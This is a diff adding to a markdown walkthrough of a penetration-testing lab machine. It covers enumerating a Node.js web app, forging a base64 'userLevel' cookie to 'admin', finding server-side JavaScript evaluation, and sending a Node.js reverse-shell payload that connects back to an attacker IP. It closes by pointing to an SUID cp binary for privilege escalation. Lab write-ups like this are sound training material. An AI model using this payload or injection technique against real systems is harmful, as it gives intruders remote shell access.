@@ -103,4 +103,59 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Thu Dec 29 10:24:30 2022 -- 1 IP address (1 host up) scanned in 56.71 seconds
 ```
 
-Node js
+After much enum done on port 21, 80. i got nothing so i decide to enumerate port 3000 http node.js.
+
+![image](https://user-images.githubusercontent.com/87468669/209940567-572bbc8c-5f02-452f-91f7-1c5be7e944a0.png)
+
+Got to see what is running on the web server. checking the source page got nothing, so i created an acct.
+
+![image](https://user-images.githubusercontent.com/87468669/209940799-ba896ea4-4571-48f1-9ebb-709a2f5b9914.png)
+
+create an acct and hit register button and login.
+
+![image](https://user-images.githubusercontent.com/87468669/209941501-d6ec5e4d-af89-4122-8199-e3ad7dc42520.png)
+
+go to eventlogs, which allows users to create tickets so i tried to create a ticket as a regular user and intercepted the request using burp.
+
+![image](https://user-images.githubusercontent.com/87468669/209942562-7dcfa340-520d-4bc3-a649-213fc86ba97d.png)
+
+I noticed there are 4 interesting parameters: (conenct.sid cookie, userLevel that has a base64 value which was decoded to default, username and msg )
+
+![image](https://user-images.githubusercontent.com/87468669/209942978-139e1840-742c-456d-a598-720c153a65e4.png)
+
+I change the value of userlevel: to admin in base64 and Then, I tried passing encoded arithmetic operations like 3*3 in the parameters to see if the application would evaluate them.
+
+![image](https://user-images.githubusercontent.com/87468669/209943175-c656917d-1fc6-4a5a-8d64-ae196f0e5593.png)
+
+Bull's eye we got evaluation for the arthimetic operation. Now, we have identified that the application executes JavaScript code on the back-end, it is time to weaponize it. We will use a NodeJS reverse shell and see if we get a connection back to our machine. The code below creates a function that calls the JS child_process module with the require function, creating new child processes of the main Node.js process.
+
+Then it uses the spawn function to pass the shell commands; in our case is a bash shell that gets executed in the newly created child processes. And, finally, it creates a new connection with the port number and IP address of the attacking machine and piping the shell’s stdin (input) and piping out the client’s output (stdout).
+
+```
+(function(){     
+ var net = require("net"),         
+       cp = require("child_process"),         
+       sh = cp.spawn("/bin/bash", []);     
+  var client = new net.Socket();
+ 
+  //create connection to the attacking machine
+  client.connect(80, "192.168.49.243", function(){         
+      client.pipe(sh.stdin);         
+      sh.stdout.pipe(client);        
+      sh.stderr.pipe(client); 
+  });     
+  return /a/; 
+})()%
+```
+
+![image](https://user-images.githubusercontent.com/87468669/209944576-2ef1ab90-e437-4781-9cfe-23ea1e1f376d.png)
+
+Send the payload in url encoding, and Boom got shell as user benjamin.
+
+![image](https://user-images.githubusercontent.com/87468669/209944899-aba89f8f-73d0-4748-9c8f-e5088e73a3f2.png)
+
+Stabilize the shell and check for suid, `/usr/bin/cp` is an suid bin, so let's excalate privs with it.
+
+
+
+
